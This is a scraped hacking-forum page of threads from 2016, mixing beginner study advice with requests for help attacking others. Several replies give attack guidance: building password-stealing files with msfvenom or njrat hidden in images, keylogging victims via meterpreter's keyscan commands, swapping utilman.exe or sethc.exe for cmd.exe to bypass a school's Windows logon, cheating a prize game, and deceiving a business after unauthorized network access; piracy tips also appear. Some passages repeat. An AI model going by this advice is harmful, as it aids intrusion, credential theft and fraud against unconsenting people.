Quote by CodeIllusionist Also, if you really want free stuff, why not torrent?      Sorry if I sound like a noob, but what do you mean by torrent? All I know is that it's a kind of file
A torrent file is a computer file that contains metadata about files and folders to be distributed, and usually also a list of the network locations of trackers, which are computers that help participants in the system find each other and form efficient distribution groups called swarms. A torrent file does not contain the content to be distributed; it only contains information about those files, such as their names, sizes, folder structure, and cryptographic hash values for verifying file integrity.   There are sites from which you can access these files, the most popular one (kickass) went down recently,  You can use this though kickass.cd  And you'll need  an application to run the torrents   I personally use Utorrent, http://www.utorrent.com/intl/en/  You can look up the torrents section:  https://evilzone.org/index.php?page=forum&sub=thread&thread=272
So you want paid file or online currency?   as stated above nothing is free.   One way to earn money without spending would be with swagbucks. ever heard of it?   they give you points for using there search engine and also completing task.   One of the best things you could get with there points is an amazon gift card of 5$.   it used to be 450 points for amazon card, but its been afew years since i used it.

Does Kali have access to the internet? Can you access other websites or is it just this one you speak of? You should make sure Kali's networks settings are correct and maybe change it to bridge across your network if you are using a VM that is.
Providing the URL might also be helpful ..drr

Program something, like an irc bot, web crawler etc. Try learning a new language that is unique or different ie. Haskell.  Learn Networking, maybe get a certification. Learn how to exploit software, dll injection, buffer overflow etc. Learn how to use metasploit, wireshark and various other hacking and security tools. So many options. A lot of the time I focus completely on one skill, and completely master that one skill before I move on. It is better to be great at one thing, or a couple things, than subpar at everything.                       Edited by truecam (Sunday 18th of September 2016 10:01:07 PM)

Hello, it is Simsman!     I am new to this forum and to this hacking thing. I have no experience at all in hacking and networking. I am not planning to be a pro neither do I want to understand in detail EVERYTHING I learn. In short, I want an amateur learning, very amateur learning .. like 1) open this 2) enter this code ... etc. I am originally a medical student so it is not really my field although I have some experience in coding for games in Lite-C and I am some what attracted to computer science     Now, I want to learn these particular topics:   1) How to 'mine' a file to steal passwords (i.e. how to make some file like a Music file for a song ,not an .exe file , such that when the victim opens it, it copies the saved passwords and all the necessary information to hack a Facebook or Twitter or Yahoo! account and send them to your E-mail)   2) How to hack a Wi-Fi (I know I can search that and get results here or any other place, but I want you to provide me with the BEST and FASTEST solution as I am not planning to spend so much time going from a method to another, just tell me what is the name of the method or software you prefer based on your experience and that works for you nearly all the time)   Thank you all and any help would be appreciated          Edited by simsman333 (Sunday 18th of September 2016 02:31:11 AM)
1.) This is called backdooring a file and can't be done with simple mp3's unless you happen to find a file parsing bug in the particular music program they use that allows for code execution. An alternative is using a file such as a Word document or PDF which itself is in fact malicious as these types of file formats allow for macros and code execution which could get your victim to run malicious code to steal the passwords and send them out.    For the second option, look into the Metasploit framework and in particular msfvenom   2.) This depends on if the network is WEP vs WPA/WPA 2/WPS . You'd be best looking at aircrack tutorials on youtube.                       Edited by x_X (Sunday 18th of September 2016 02:53:34 AM)
1) Details ,please?    2) Thanks.
I've already instructed you to look further into msfvenom. Google is your friend here
#1: Check out keylogging. (Not necessarily "mining" but it's similar) #2: Check out Aircrack, Wifite, Reaver ... Quote by simsman333..software you prefer based on your experience and that works for you nearly all the time)   It works all the time if you do it right.

There are several things to guide you:   1. https://evilzone.org/index.php?page=forum&sub=board&board=39  2. https://evilzone.org/index.php?page=forum&sub=thread&thread=3988   That's all.
I am in the medical field too, and there were moments I felt I needed a quick easy detailed step by step  guide because I didn't have the patience to learn the needed skills and time was really scarce.   I learnt the hardway that there is no shortcut to things in life and hence, I planned and partitioned my time well for my hobby and my profession. And now I am admin here.  Everything is going to come out of hardworking and dedication. I know the fields that interest me but read ally of articles from fields that I don't endulge in often.   And don't just read books, setup a lab and practice as you learn. If its web application pentesting, setup a vulnerable app and exploit it as you learn. Same goes for wireless and any other field. You might not always have the funds but there some Starbuck networks or a dumb neighbour near you that you can workup on.    So stop waving the medical flag for any sympathies and go work.   Does that inspire you enough.                       Edited by kenjoe41 (Sunday 18th of September 2016 11:32:30 AM)
I don't know but I thought you misunderstood me     For the Google and eBooks guy .. I don't know THE NAMES OF THE TOPICS, why are you getting me with a list of eBooks and a very weird unnecessarily LONG thread about - Surprisingly!! - GOOGLE SEARCH ENGINE if I don't know the names of the topics I want to learn? I am ok now with the Wi-Fi thing but I am talking about the first thing I asked about ... I searched what you told me about but I couldn't really start to learn it right away ... so many things I don't understand     I just wanted the names of topics ,not necessarily a step-by-step article ... like learn "this kind of encryption" and "combining files" or whatever .... just the topics and where can I learn the basics for them ...

Hacking is rarely that easy and depends on essential building blocks. It's rare that you can just jump into one section of a subject and expect to get very far
Grow up. Come back when you got your boots laced and have taken a few on the chin for speaking your mind in the midst of grown men. This amateur pre pubescent without experience in all things under the sun wants a hacker walk through like this shit is final fantasy 7 and he's all out of the Common Sense materia or Respect mana.   Your not from privilege here son.

Your not from privilege here son.     No one here is talking about final fantasies   ... I am not planning to be a pro ace hacker .. I respect you all and appreciate what you do ,but still I am not really into it. Not that I don't have time for it ,but I am not into that thing  Still, I actually can jump into one section without attaining a major in hacking or computer science   ... I appreciate the fact that you love computer science and really hate this idea of someone just hitting on the forum and willing to be a pro in no time and you spent decades from your life to reach this point!!!   ... but I am not that person ... I don't need to learn a new language or study the whole internet architecture ... LOL I know it because I know a friend who could hack accounts without so much learning  (don't please tell me to ask my friend ,it won't work at all)   I am looking for a pathway .. like learning njrat and combining the produced malware with an image file using WinRAR SFX after encryption ... things that simple don't need a lot of basic knowledge     And btw. I am not your son .... Damn ,nigga'!   I just needed some articles, videos or books ... what did I do wrong?!!   And sorry for my immature kiddish behavior ... I apologize      EDIT:   LOL Even if I wanted to be a pro, your replies won't help at all ,there is no clear learning pathway           Edited by simsman333 (Tuesday 20th of September 2016 04:31:02 AM)
Can we go ahead and get this locked? This thread has gone to crap
So...guy comes in and says "I want to perform a gall bladder removal on a friend but I don't want to take a class in A&P, surgical procedures, anesthesia, or anything like that.  I passed high school biology and did an experiment with plants in middle school, so I should be good enough.  I just want someone to point me on the right path."    Someone else replies with "Look up laparoscopic cholecystectomy and everything related to it."  Yet another person replies with "Just go to college and take all those classes that you said you didn't want to; it's the best way, really."  Guy gets all defensive and seems to think he's not being treated with respect.  Guy is wrong.   The first issue here is that you were already given information that would help you on both points.  The second issue is that you are completely disregarding the complexity of the field in which you're trying to meddle.  There's so much information that's dependent upon other information that's dependent upon other information.  Taking shortcuts isn't just 'ill-advised'; with some topics it's not even possible.   This is mostly a case of not realizing how deep the rabbit hole goes.  It's like people believing the Earth is flat because they cannot fathom the sheer scale of the planet upon which they reside.  Idiots trying to do science through religion.  This is not unlike the ignorant trying to heal people by balancing their humors.   And your friend that can 'hack accounts'; either he knows more than he's letting on, or you're too stupid to realize what's actually happening.
Hey guys, new in this forum and pretty much on this world too     Anyhow, Im playing a facebook game which is a temporary game and not that well secured because already few guys hacked it (not that many playing it tho). However, because some guys already managed to hack it its impossible to compete against them with fair play. So yeah u guessed right, I need help to find out how to do the same    If anyone could help please let me know by a PM or with a reply here so i can share information with you.   P.S. the game in online only for 2 more days      Thanks!
Some more info about the game...  Its a memory match game with 18 pairs so 36 cards. When the game is started there is a countdown (minutes : seconds : milliseconds) timer which starts from 11 minutes and 40 seconds. The game stops when the timer reach zero or when u find all the 18 pairs. Points are connected with the time. How many seconds left after finishing the game equals the points. EXAMPLE: I started the game and finished it in  1 minute, means 10 minutes and 40 seconds would been left and that time is converted into seconds/ points, 10 minutes * 60 seconds + 40 seconds = 640 seconds, so that would be my score. The leading guy has 698 points, what means he finished the game in 2 seconds and well, thats pretty much impossible.    I tried to find the time with cheat engine and did find seconds, also managed to stop them on display but they still were active in background. Also I disabled my automatic PC time and set it manually, for example when i started the game it was 13:15 and then i moved my clock to 13:10 what added 5 minutes to the countdown timer in game but also only a visual effect, in the background the time was still counting. My guess would be that they somehow managed to manipulate the points and did not touch the time, but after all Im a beginner, well a noob, in this cheat engine world so its just a guess. One friend suggested charles web debugger to try with but i have no idea how to use it and doubt that i can learn in 1 day    If anyone at least has a suggestion or something, it would be awesome    Thanks n sorry for a post after post admins
Is it a mostly javascript based game? if so you could just look for the solve condition function and try to manually call it.
Yep i think its mostly javascript, not flash for sure. But dont have an idea how to do it so   Could you provide any tutorial video or link of text?   Thanks           Edited by ooXYZoo (Sunday 21st of August 2016 12:36:05 PM)

You didn't need to make another thread for this, just update the information here and see if anyone is interested and know how then they will help.
Hi guys, a new game appeared pretty similar to the last one (it should hackable, not a big one, continue reading Oui ). The game is only available for about 20 days and the winner can win a phone but you have to be a citizen of the country where I live. However, if anyone can help in hacking it (there is no way to win it fair because not long ago there was a similar game, same application and many hacked it, including the winner), and if I win with your help I will try to sell the phone and share some amount of the money with you.   So, if anyone is interested let me know through PM or here, thanks.   P.S. sorry admin, got it
If anyone is willing to try I  can share a facebook account which you can use to access the game, really wanna try it  already a guy with an impossible score appeared
Spend some time learning Javascript and you can pull off the hack for yourself. Since you stand to gain something of monetary value by us giving you hack for free, I doubt you'll find too many people who will just hand you working code. Just my 2 cents  http://www.w3schools.com/js/
I would like to learn but I doubt that I can do it in 15 days   Im even ready to pay but in case I would win the reward and sell it, cant do it else wise.

You won't be learning anything if someone else is getting the job done for you, overcoming a problem by yourself is what makes you better.   We need more information to help you with your game competition thing.
I did try it myself with cheat engine I managed to find the seconds of the timer but freezing the timer was possible only visually, the time was still running, however I doubt that they did the cheating through time stopping, because it would take them too long, but maybe the managed to write the time themselves.   Second option I tried to do is to find the final score and change it, but wasnt successful with that. The score is connected to the timer. Left time after finishing the game is converted into seconds and thats the score. Example: I started the game and the timer countdown started from 41min 13 seconds, so lets assume I needed 1 min to finish the game, that would mean my time was 40 min 13 sec and thats converted into seconds: 40 * 60 + 13 = 2413, so this would be my final score. thats how the game works   Last thing I tried was to execute javaScript functions through the Google chrome console. With the "end_game ()" function, it did finish the game but it sees it like I went out of time, so score was 0. One more function I tried was "$.APP.resetTimer ()" and "$.APP.stopTimer ()", it did stop the time but not in the background.   On the previous page you can see the JavaScript code of the game. At least a suggestion what might they have used to cheat, JavaScript functions, Cheat engine or maybe something else, so I can concentrate on mastering that one thing and eventually succeed.  Code// End the game and submit the solution   function end_game() {    var solution = [];      game_active = false;        $.APP.stopTimer();    active = [];      // Construct solution    $.each($('.memory-tile.tile-hit'), function(i,v) {     solution.push($(v).data('card-id'));    });              .CodeMirror {height: auto;}      var element = document.getElementById("code-R6bcINGMZw");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       Is there a way to execute this solution maybe?     One more thing, could charles debugger do anything? As I understood the tool acts like the server and after i manipulate the data it sends it to the original server?   Many thanks again and hope for some suggestions     P.S. the shitty thing is, I have only 2 tries per days, limitations of the game           Edited by ooXYZoo (Sunday 18th of September 2016 12:22:59 PM)
First of all, it is even hard to read what is written, couldn't you just rewrite the characters you see there in post so that we have no trouble with basic understanding of what is written?
We will need some kind of context for this. When, where, why, how did you get this? Looks like something I solved in a CTF some time ago.
If this is supposed to be for something in English, I would recommend doing frequency analysis on the characters. The most commonly used character is very likely to correspond with the letter 'E' as that is the most common letter in the English language.   As the others have said, it's kinda hard to read, please try to write more legibly
That looks like a quick picture made at school. With high probability the guy who made it isn't a real cryptographe. If that is the case, you can decode it with a quick research on the net. Else...you'll have to learn cryptographie   Success
iceCTF had one of these a few weeks ago. Each character corresponds to a letter. You need to do a statistical analysis of the symbols/English alphabet to solve that.
I think they are half completed letters.   Does this link below help you decode it?  https://www.fastcodesign.com/3049351/can-cutting-letters-in-half-help-you-read-faster-online                       Edited by FrozenroboT (Saturday 17th of September 2016 06:39:44 PM)

1. With torrent widespread you do not need to buy anything. Not even payable Visual Studio by Microsoft.   2. Deppends on what you want to hack. Is it application hacksing, is it web hacking (pentesting).  3. All languages are so so alike when it comes to understanding programming, only syntax vary. You need to understand how machine works (computer), how data is placed in RAM, how system operates on a lower level languages (keep in mind that high level languages are like VB, PHP, JS,C#,C++,C, etc)  4. Read more about IP addresses, read more about how protocols work, how client and server relation work. You must understand that any website has it's own unique IP address. You may see it as URL (uniform resource locator) with letters and stuff, but for machine, it's all numbers. When you click to visit any site, server just know your IP since you are a client visiting the server, and returns the request back to you (for whatever you asked for (if permission is alright)  5. There is no secret method or path to follow and it wouldn't mean much to you. As I always say, and ande will confirm, in order to find vulnerability for something, you MUST know how that thing operate to the very detail. Think about this, you wanna run? Well, first learn to stand, then to walk, then to run. Same with hacking. First learn how computer operates, then pay good attention on low level languages (google about them), then move on to high level languages.  6. It does not matter. Honestly. Why would be? You plan to kill yourself so you wanna know will you finish in time? LOL. Just go with tempo that suits you.
Thank you
Very educating. I really wana learn penetration testing but i dont know where to start from. I hve a good idea of htm,c#,sql,ip address but i dunno how to combine these kills to hack. Is there any book i can read on hacking

Great. Now that you have decided to become a hacker and ready to work hard, Right?    Now that you have taken up a challenge, here's how to get started? (Others here can you give better insight but I will share my way)    Steps:   1. First things first, Learn to use Google and how efficient searching can be done.    2. Second whenever you need to know about some topic learn how to compare the articles you get on the web and decide which is better. We can help you here if you start a new topic but it should look as if you've done your homework.    3. If you're not familiar with Linux, then start using one, I would recommend you to go with Debian or Cent OS. But choice is yours.    4. Now it comes to technical topics. You need to understand the following well:   a. Networking: TCP/IP Layers and How it works, ISO-OSI Model, Routing, IP Addressing (IPv4 and IPv6), Packet header format (both IPv4 and IPv6), ARP, DNS, Mail Servers, How different layers work among themselves, error detection mechanisms, SSL, Remote logging, SSH, telnet, Web Servers, VPS, VPNS, Wireless Networking. How to learn all of these?  it will take some time for you to digest the above, but you need a proper base to get started. Search Google, Youtube, Reddit for tutorials. I recommend Professor Messer's tutorials (You can find them on Youtube)   b. Programming: It is very important for you to know how to program, you can start with Python, which is a beginner friendly language and very powerful and loved by Security Professionals worldwide. Later, you can learn about shell programming, and PHP, and MySql, C/C++. How to learn all of these?, Search Google, Youtube, Reddit for tutorials. For python you start with the free online book, Learn Python the hard way, or Dive into Python. For lessons on PHP and MySql, search Youtube.     c. Learn about Windows Security internals, get curious with Sysinternals Suite and make Hex editor your girl friend.    d. Learn how to setup servers, use Open Source API, use several tools available on the web etc.     e. Install Kali/backarchlinux/backbox and get hands on practice. Make sure you are doing your tests in a controlled environment.    f. You can study the video courses provided by Cybrary.it and read about security in general from many different blogs.    g. You have vulnhub at your disposal to practice hacking and pentesting.    We have got a lot of resources as well. Take your time and browse the forum. Note I have given a very lightweight answer I believe and it requires you to do your own research. You can never be a hacker if you want others to spoonfeed you. So search and if you fail, try us and we will help.    Good Luck.

Dear Evilzoners,           I have installed anvirus softwares but of no avail. But I have also installed some advanced anti-rootkit tools to detected some suspicious entry point of driver. The next step seem to be only reverse debugging. But I have no such experiences.          Could anyone please recommend some useful and preferably well written books on introduction and demonstration of reverse debugging?    Best Regards!
There are no such thing as reverse debugging. There is debugging and, perhaps you mean reverse engineering?   They are kinda old, but classic.

Thats our proprietor, going out of his way again... making a good example of forum conduct.   I remember OP from IPS. Hes using a different handle now but still on the driver root kit.    On IPS he gave 3 different stories for the same problem.   In one scenario he was the attacker, on the other scenario he was the victim.   Its unclear what his intentions are and IMO hes shady.   Unfortunately I do not have access to old IPS else I would provide examples.   Just saying..                        Edited by 0E800 (Friday 26th of August 2016 08:40:46 PM)
Well, this is Evilzone hehe. Shady is fine    Without talking about OP as if he is not here.. He may just be inexperienced in these things and therefor asks carefully around with different scenarios. Besides, this is the right way to ask if you are actually doing something shady/illegal.

Whoa, it's a good guide but it's hella bright with that white background lol. Any way you could swap it for a darker background?
Sorry, just screen captured the website to png. I'll figure something out to try to add transparency.

I'm a new member here and I want to get started with hacking, but where should I start?   Personally, I'm interested in finding out people's IP and tracing them, getting their information. But I don't know a thing on how to get a person's IP. So any tutorials are welcome.   And if you guys have some other things to get me started, I'm all open for them. I need some directions to learn.
Getting someone's IP address is hardly going to do anything now that SoHo routers have implemented NAT. Go learn to code in C or Python or similar, being able to develop your own tools is going to further you in hacking far, far more than whois'ing IP addresses for omgd0x
I didn't get much of what you said :D Sorry I'm a bit foreign to the hacking world and I don't know the terms as SoHo routers, NAT, omgd0x. But I know Java and C++, going to learn html and unix too. But what would you suggest me to get better besides a coding language?

Ehehehe, no not those right now. But I'll learn c soon enough. I dont know about python but I'll go for c# after c.
html is not a language btw
Imo you should stick to one language and learn it inside out. No point learning a little bit of everything if you're not gonna understand everything.
Anyone know a good place to learn C? After looking at these posts, I think I might as well learn C to if I wanna start
Quote by hcnnhtml is not a language btw   Hyper-Text Markup Language is not a language? What you maybe wanted to say is that it isn't a programming language, which is true.
Use w3school  to learn any language   C, C++, java etc  wish it help you !!
I think you can start from pentesterlab. https://pentesterlab.com/
well, I'm too new here & since i'm pursuing mechanical engineering i hardly know coding , im trying by best to learn python at codecadamy , i could use a little help
"Become a Programmer, motherfucker."  http://programming-motherfucker.com/become.html  (It's a list of programming books)   For me Python is also a good choice, I program in python most of the time because it's fast to develop on it. You can write quite big tools with few code. I has tons of packages and it really goes well in "low level" (it is not C, not that low level) and "high level".   For hardcore guys I recommend also Perl. But it is mandatory to "feel" the language in this case. It is similar to Python but it may be more difficult and, in my opinion, it is better for higher level things.                       Edited by k4d (Thursday 1st of September 2016 09:32:19 AM)

Could you provide far more context as what it is you actually want?
I want a crack for this or serial key generator. What you don't understand?    This is a video with this program and what is he doing:  https://www.youtube.com/watch?v=RpcxlHgjR9I
This isn't really the section to request warez... Try Software or Found It On The Web
Don't know about Cracking the program but try hooking it up to a VM and running the free code they give out every time it reaches 100%. Then destroy the VM.  This way you can keep using the free code over and over again.   This should keep you going until you have a crack/serial.

Quote by markopolo62I need help.. i don't know how to install or use linux. what should i do?   If you're new to linux, then I would recommend using Linux Mint. It's based off Ubuntu, but a bit more friendly to new users, and has a few more features out of the box. Just download the iso and either burn it onto a disc, or mount it onto a usb flash drive. Afterwards, insert the disc, or flash drive and turn on the computer. If you want to dual boot linux and another os, you will need to partition your drive, post here if you need help with that. Once you turn on the computer, it should default to the installation media and begin the installation process, it should be fairly straightforward, but Here is the documentation for Linux Mint, it has a step by step guide for installation if you need it, as well as some information on getting started. Once you get it installed mess around with it and see if you can figure it out on your own. If you need any more help with the installation, or have any questions feel free to post them.
I would recommend you to download vmware player or virtual box and run some linux distros in a virtual enviroment first.   Just to try some distros out and to learn how Linux basics works.
Alright thanks I'll look into it
Great!  Ask anything if you get stuck and I'll try to help you out.

Once you turn on the computer, it should default to the installation media and begin the installation process, it should be fairly straightforward, but Here is the documentation for Linux Mint, it has a step by step guide for installation if you need it, as well as some information on getting started. Once you get it installed mess around with it and see if you can figure it out on your own. If you need any more help with the installation, or have any questions feel free to post them.
I would recommend you to download vmware player or virtual box and run some linux distros in a virtual enviroment first.   Just to try some distros out and to learn how Linux basics works.
Alright thanks I'll look into it
Great!  Ask anything if you get stuck and I'll try to help you out.

First of all, alphabet is a group of letters used in any language. I for example use cyrilic alphabet that consist of 30 letters. English alphabet uses 26 letters.    About decoding - My guess is that you talk about "one way" algorithms. Such algorithms use plain text and make hash from it. Now, this mathematical process is ireversable witch means once you do it, no one can gain original text. BUT, even though hash is unique for different texts, understand that it does not matter if documeng has 10k characters or 3. You see, for example, MD5 algorithm creates 32 characters long hash fof ANY text.    Now, your question is not complete. How can we talk about getting plain text if you do not know what algorithm is used for making hash? It is different for every algorithm and there are many. Can you show us that hash?

Do you mean by people stealing your IP address or details, or to stop people from using social engineering techniques on you?
I mean "stealing my IP address or details" and "stop people from using social engineering techniques on me"
Common sense really. Leverage a VPN/Proxy/Tor to hide your IP address, don't click links you don't know without going through a proxy, don't tell people anything about yourself you don't want them knowing,etc.
Also use SSL when connecting to the IRC server. If you need help on doing that, feel free to ask.

Quote by ExOni hawe mIRC but i cant join evilzone or i am to stupid xD   i check that web site and still tonthing    You basically just fill in your username and stuff. Then you have to add a new server. Evilzone is not in the default server list. Server details can be found at: https://evilzone.org/index.php?page=irc_network

Quote by ExOnloks like i find and add it but when i  tipe in chat its shows you are not on chanel xD   Actually, the easiest I can think of in mIRC is to do the following.   - Just exit all popup stuff, so that you have one "chat" window.  - In the chat window (bottom) you type /server irc.evilzone.org and hit enter  - Then once you are connected you type /join #evilzone
i delete Mirc i instal HexChat

Why did you opt out for something that you suppose would be easier when all you had to do was follow the steps ande gave you or even just play around a bit more until you found your answer?
Quote by ExOni delete Mirc i instal HexChat  Hi, ExOn. I use mIRC. It depends on what version of mIRC you use. Before version 7.45. You could reset your trial days count by editting registry. See this: http://www.social-anxiety-community.org/db/showthread.php?t=58718. I think this is the foolest way in hacking, but anyway, it is a way of hacking, you may try it.

You could create a meterpreter payload through metasploit using a javascript exploit which lead them to a fake page, this would then download a meterpreter payload to their computer and use keyscan_start to start your keylogger and keyscan_stop to stop the keylogger.
They need to click on the attachment or a link, theres no magical way to infect everyone that checks their email.
Like FullSpeed said. You must get them to execute something, however the key logger would also need to get passed any anti virus that might pick it up. Plus if they are using Windows which is highly likely it also needs to get passed UAC, if the key logger requires admin rights UAC will prompt the user to run the file, making it more suspicious.
I know of a few good key loggers that can get through UAC and other antiviruses but I am seeking for a way to get them to execute it without them knowing. I've been hearing a lot about metasploit but I am still curious if that would work
Read a bit about social engineering, Its not that simple to persuade people to click on your link.     It doesn't matter what keylogger you use if you convince them to click on it, they will. I would recommend you to try and code one yourself, then you can really choose what exactly you want it to do.                         Edited by FullSpeed (Monday 29th of August 2016 01:41:23 AM)

Never used mimikatz personally but I think its fair to say that if it has actually grabbed a password (and has not just thrown out a string of garbage), then it has taken the hashed state of the password. This is done basicallly so that shit like this won't work. If this is the case, then the only way you'll be able to crack the password is by knowing what hashing algorithm is used to scramble it and then reversing it. which it is fair to say is not the easiest thing in the world.    This is all just speculation mind. I could be (and probably am) talking bollocks.
It looks like SSL captured from wireshark. If its AES you will need a key.   Review:  http://www.yellowpipe.com/yis/tools/encrypter/index.php   You can atleast verify what its not.

Hi, i was wondering how some jack wagon got my gmail password. I received a notification on my phone stating someone was signed in on a new device. I got his ip and traced it back to this company.  NFOrce Entertainment B.V.     If i had to guess its a VPN?? The ip was in the Netherlands. Can anyone tell me what this means and what i can do about it? Thx                       Edited by INSOMNIAC (Thursday 25th of August 2016 12:03:38 PM)
Change your password. Its not worth the hassle.
The best method is like dmzero stated is the change your password but you might want to work out how he/she got your password in the first place, as they might have access to your computer; keylogger/ RAT or virus etc... You don't want to waste time changing and updating your password if they can just keep getting the new one. Retrace your steps.                       Edited by Katheudo (Thursday 25th of August 2016 05:40:33 PM)
Is it possible that you recycled or gave away your old phone/computer?   Did you sign in at one time or another on another computer?
Why don't you have 2fa on your gmail? This will easily solve the issue of someone stealing your password because they would have to steal your phone too
Ya i did. I ran netstat -a in cmd and a few devices popped up showing that their linked to my computer, but im not exactly sure how to find out who or what they are.

Been using duo.com for 2FA.   Works well. $1 per user account per month.   Nice admin panel to.

Seems like you have all the info you need here, but I would like to just weigh in too. You really should try and find the weak link in the chain and find out how this chuckle-fuck got your password in the first place. Once you fix that, and replace the existing password with something more secure, start enabling 2FA on all of your accounts not just your GMail.     If you think they got your password through BF then you should consider creating a password that is long and is constructed of mainly random characters (or made-up bizzare words) so that you are less vulnerable to key word and dictionary attacks. If on the other hand, you think you may have been keylogged, then consider using some sort of service that stores passwords so that they dont have to be typed. OSX has the key chain and i'm sure windows must have something like this. I remeber watching a talk from zoz at defcon where he talked briefly about the merits of keychain in preventing key loggers.   Anyway, this information may be overkill or just telling you shit that you already know, but I thought I would throw in my two cents just incase it's of any value.    hope you get this sorted man.

Great info man! I'm still new to most of this stuff but I don't want anyone hijacking my accounts. Thanks much appreciated.
Dude! I got the same thing from NFOrce Entertainment B.V. from Netherlands too on August 25th. I was like what the hell???
Are you on about this company https://www.nforce.com/ ? If so it is a hosting service... Guessing since you said you tracked his IP you must of been on some website that is hosted at https://www.nforce.com/ ? Or he was using it as a VPN service...
Probably he was using it as VPN, don't think a company would be hacking gmails
Quote by CraZyExp10itProbably he was using it as VPN, don't think a company would be hacking gmails  Yeah probably as I stated this. But he could be using them to host a website in which OP clicked on and either download something from or run some malicious JavaScript etc...
Hello fellas ,   There's a business not far from where I work , I managed to get into their network and had control of definitely every device on there(Cameras , working stations ... ). The good person I am , I'd like to secure their network in exchange of a little reward .   So how do you suggest I proceed ? any precautions I need to take ?
Don't fucking tell them.
Just send them an email about it. If they dont believe you, order up 9001 of some product and tell them again. If they still dont listen, fuck em up a bit    Don't expect rewards often. Most of the time they get angry..                       Edited by ande (Thursday 4th of August 2016 09:45:21 PM)
If you want a reward don't tell them you hacked their network, but rather that you believe their network may possess security vulnerabilities and you'd like to offer your services in fixing the issues. You might also want to make it sound like you're part of a IT firm, or even that you're an IT enthusiast trying to start their own firm, so they'll be more likely to trust you. If you choose to convince them you're an enthusiast trying to get started, try to get them to sympathize, make them think you want to help people protect their networks, but don't sound too charitable.
Send them an anonymous email regarding it. I'm sure they won't take kindly to someone that gained unauthorized access into their network. Their response will most likely be something like this
Dont do shit. Simple. Otherwise...reward yourself with getting tangled in the courtsystem
Like others have said, don't bring it to their attention that you "compromised" their network.  You didn't have authorization to do that, so not sure where you live, but most likely you broke the law.   Maybe if they had a public wifi and it was a  gathering place (Restaurant, bar or something) maybe casually go in there and order something.  Then as you are leaving say something like:   "Hey I was on your public wifi, and noticed a bunch of computers that probably shouldn't be on the wifi are on the wifi."   Don't be like   "I haxxored your network, pay me money to fix it."
Yea.... this isn't Mr. Robot. They'll most likely try to pin the security flaws on you and then sue you for "damages".
I would recommend not telling them about it. It's most likely that they will try to sue you in some way. Either way, it will not be good for u.  Basically, small sites = try to f u over and try to flip the coin  Larger sites (google ect) = will most likely be more welcome and possible provide you with a bug bounty
I did a similar thing at my doctor's, found my way inside of their printer. I never poked around enough to see if it led anywhere, but when I anonymously told them they just refused to accept it... Two weeks later some they paid some IT company to fix it. If anything, figure out how to fix it first, that way they might believe/pay you.
Lmao don't tell them.. I found a sql injection on a cinema website (cinema near me), when I emailed them about it they were threatening me with police. Most companies don't take security seriously.                       Edited by FullSpeed (Saturday 13th of August 2016 12:15:02 AM)
Post their creds on pastebin already or why don't you secure their connection with your keys?   By securing their network by locking all the doors you found, you will be doing them a favor while increasing your online realistate. Risk WWW Edition.   Other options include using office as VPN, or Tor exit node.  One by one start changing static IP addresses until they decide to hire a tech.  I
Yeah you're balancing the typical line that a grey hat always does. Exposing faults in a system before getting permission and then trying to be ethical about it and fix it for them. However, the problem is most organisations won't see it as you having no malicious intent, they will see it as you breaking into their system. And, as w0ot3d said, they may well try and take you to court for damages (even though you've not caused any real damage).   Being a grey hat is a total hassle. It has its perks but it can get you into trouble pretty easily.   I personally wouldnt tell them. Breaking into systems is fun, but breaking into those that arn't your own can have pretty dire consequences, and is typically something that I avoid.    Anyway, that is just my opinion and is in no way more or less valid than anyone elses here.  ultimately it's up to you dude, but just be aware of what could happen.
Well sorry to break it to you, the reason that CMD is blocked is because you are not suppose to access it on a school computer. Plus asking this type of question on EZ is not going to get you far, why do you need CMD? What are your motives behind using CMD on a school network? - I think it is more than just requiring admin to run a few programs...   However, if you wish to use CMD its likely that it will not work. You could boot Windows up in safe mode and then I think you can access CMD after you log in but even then some of the commands are still blocked, so it is kind of pointless.

Could always try the trick you would use to recover a lost password on a windows machine.   https://www.technibble.com/bypass-windows-logons-utilman/   1.  Basically, boot into a Installation CD of the version of Windows  2.  Get to a command prompt from the installation cd  3.  Make a backup copy of utilman.exe  in system32 folder  4.  Make a copy of cmd.exe and rename it to utilman.exe  5.  Restart the computer and when at the logon screen, click the icon for "assistance" (on-screen keyboard and such) and button launches utilman.exe which you've made into a cmd.exe.   It might work, depending on how the school admin has locked out CMD privileges.  I'd venture to guess if he used group policy you might be ok, as no one is logged in yet to enforce a group policy.         Edited by Infinital (Tuesday 23rd of August 2016 03:41:43 PM)

Basically, boot into a Installation CD of the version of Windows  2.  Get to a command prompt from the installation cd  3.  Make a backup copy of utilman.exe  in system32 folder  4.  Make a copy of cmd.exe and rename it to utilman.exe  5.  Restart the computer and when at the logon screen, click the icon for "assistance" (on-screen keyboard and such) and button launches utilman.exe which you've made into a cmd.exe.   It might work, depending on how the school admin has locked out CMD privileges.  I'd venture to guess if he used group policy you might be ok, as no one is logged in yet to enforce a group policy.         Edited by Infinital (Tuesday 23rd of August 2016 03:41:43 PM)
You could just try and log in as the Administrator, the 'tech' people in my schools were dumb and used the same password as login.

Believe it's sethc.exe in Windows 7+.  It's also easier to use a Live Linux Distro over Windows since Windows is so anal about version matches. Basically you can use anything that will allow you command line access.  I've had to do this more often than I care to admit.
How I had gotten myself CMD to work...   1. Open notepad.  2. Type in there: command.com  3. Save it as: cmd.bat  4. Run the file saved.                       Edited by NullSec (Tuesday 23rd of August 2016 04:17:23 PM)

While a Linux cd would be good to use, using my method if he left the cmd access from the logon screen, he could get in and out of that quicker than trying to boot up a live cd.

But by doing this how are you going to overcome the social side of it, won't you be in a class with like 30 other people. They might see you and report you or ask what you are doing and create unwanted attention...

The only attention I got back then was from sexy ass ladies living 1 mile away wanting to have sex with me. Okay, maybe not. But usually no one's going to report you to the teachers or whatever. Just make sure to trust them, or say some BS that you are not hacking or whatever you're doing. If he does report you to the teacher, just close the window off and you're safe. When he says "Mr. Robot (  ), he did this and that bla bla bla", and you can just be like, "what are you even talking about...?".
You need to be able to communicate with the hosts in order to scan them. If the only way is via internet you might have a hard time with NAT.
Use nmap.
Quote by jyggorathUse nmap.   His machine isn't on the same network, how are you going to scan those hosts? Even if he found the PUBLIC IP for the network target, it is probably an address sitting behind a NAT rule. If they know what they are doing of course, then this will make life hard for outside users like the OP from enumerating internal IP addresses with nmap.     OP if you somehow are able to get onto the same network you can use nmap to scan for hosts, and ports, with their operating systems also displayed.
